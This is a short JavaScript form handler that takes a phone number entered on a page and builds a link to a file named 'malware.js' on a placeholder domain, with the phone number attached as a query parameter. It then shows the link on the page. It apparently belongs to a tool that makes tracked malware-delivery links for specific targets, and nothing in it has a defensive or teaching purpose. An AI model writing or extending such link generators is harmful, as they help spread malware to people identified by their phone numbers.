document.getElementById('accessForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phoneNumber = document.getElementById('phoneNumber').value;
    const link = `https://yourdomain.com/malware.js?phone=${phoneNumber}`;
    document.getElementById('generatedLink').href = link;
    document.getElementById('linkContainer').style.display = 'block';
});
